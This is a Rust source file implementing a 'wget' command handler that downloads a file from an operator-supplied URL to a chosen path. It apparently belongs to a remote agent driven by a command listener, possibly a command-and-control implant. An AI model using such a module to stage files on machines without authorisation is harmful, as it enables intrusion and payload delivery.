use crate::internal::listener::{TaskHandler};
use std::path::Path;
use std::env;
use crate::internal::http;
use std::fs::File;
use std::io::Write;

pub static COMMAND: &str = "wget";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!("Executing command `{}` with args `{:?}`", COMMAND, args.clone());

        if args.len() == 0 || args.len() > 2 {
            return Ok("Invalid number of arguments received. Usage: 'wget [URL] <optional: path>'.".into());
        }

        let url = args.first().unwrap();

        if url.is_empty() {
            return Ok("Invalid number of arguments received. Usage: 'wget [URL] <optional: path>'.".into());
        }

        let url_parts: Vec<&str> = url.split("/").collect();

        let file_path = match args.len() {
            2 => Path::new(args.get(1).unwrap()).to_path_buf(),
            _ => Path::join(&*env::current_dir()?, url_parts.last().unwrap_or(&"temp_file"))
        };

        let contents_future = http::get_file(url.clone());

        let contents = match futures::executor::block_on(contents_future) {
            Ok(contents) => contents,
            Err(_) => return Ok("No response received. Ensure you format the url correctly and that the target server exists. Example: 'wget https://yourhost.com/file.exe'".into())
        };

        let mut file = match File::create(file_path.clone()) {
            Ok(f) => f,
            Err(_) => return Ok("[ERROR] Something went wrong saving the file.".into())
        };

        return match file.write_all(contents.as_slice()) {
            Ok(_) => Ok(format!("Downloaded file from '{}' to '{}'", url.clone(), file_path.display())),
            Err(_) => Ok("[ERROR] Something went wrong saving the file.".into())
        };
    }
}